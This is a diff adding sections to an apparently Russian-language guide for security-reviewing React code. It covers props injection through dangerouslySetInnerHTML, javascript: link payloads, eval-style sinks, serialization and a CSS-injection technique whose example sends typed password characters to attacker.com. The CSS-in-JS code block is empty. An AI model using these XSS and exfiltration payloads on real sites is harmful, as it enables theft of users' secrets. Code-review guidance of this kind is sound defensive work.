@@ -91,6 +91,113 @@ function MyComponent() {
 }
 ```
 
+### Props Injections
+
+В React есть возможность передать в компонент массив с переопределенными атрибутами. Если атакующий может контролировать этот массив, то он сможет определить ключ атрибута `dangerouslySetInnerHTML` и добавить туда свою нагрузку:
+
+```jsx
+import './App.css';
+
+function App() {
+  const STRONG_PAYLOAD = "<strong>TEST</strong>";
+  const XSS_PAYLOAD = "<img src=x onerror='alert(123)'/>";
+
+  const PROPS_INJ_PAYLOAD = {"dangerouslySetInnerHTML": {"__html": STRONG_PAYLOAD}};
+  
+  return (
+    <div className="App">
+      <header className="App-header">
+        <div {...PROPS_INJ_PAYLOAD} />
+      </header>
+    </div>
+  );
+}
+
+export default App;
+```
+
+### Injectable Attributes
+
+```jsx
+import './App.css';
+
+function App() {
+    const ATTR_PAYLOAD = "javascript:alert(1)";
+    
+    return (
+        <div className="App">
+          <header className="App-header">
+              <a href={ATTR_PAYLOAD}>Link</a>
+          </header>
+        </div>
+    );
+}
+
+export default App;
+```
+
+### CSS in JS
+
+У React есть возможность определять стили для компонентов прямо в JS коде, используя JS синтаксис:
+
+```jsx
+```
+
+### Eval-based Injections
+
+If you can control a string that is dynamically evaluated, you have hit the jackpot and may proceed to inject arbitrary code of your choosing. This should be a rare occurrence.
+
+```jsx
+function antiPattern() {
+  eval(this.state.attacker_supplied);
+}
+// Or even crazier
+fn = new Function("..." + attacker_supplied + "...");
+fn();
+
+// Example
+const addition = new Function(‘a’, ‘b’, ‘return a+b’);
+addition(1, 1)
+
+// Так же нельзя допускать, чтобы строки попадали 
+// в setInterval() или setTimeout() как аргумент
+setTimeout(“console.log(1+1)”, 1000);
+
+```
+
+Соответственно, ищем использование:
+
+```jsx
+eval()
+new Function()
+setTimeout()
+setInterval()
+```
+
+### Serialization
+
+```jsx
+// Это всегда плохо (почти)
+Ищем JSON.stringify
+Ищем YAML, XML, Markdown,...
+```
+
 ### Incorrect work with location
 
 Ищем по коду работу с `window.location`. Здесь могут быть и не так обработанные параметры, и Open Redirect и CSRF и тп.
+
+### Чем вообще могут помочь инъекции в стили
+
+#### Password stealing
+
+```jsx
+<style>
+    #form2 input[value^='a'] { background-image:url(https://attacker.com/?a); }
+    #form2 input[value^='b'] { background-image:url(https://attacker.com/?b); }
+    #form2 input[value^='c'] { background-image:url(https://attacker.com/?c); }
+     [...]
+ </style>
+ <form action="http://example.com" id="form2">
+   <input type="text" id="secret" name="secret" value="abc">
+ </form>
+```
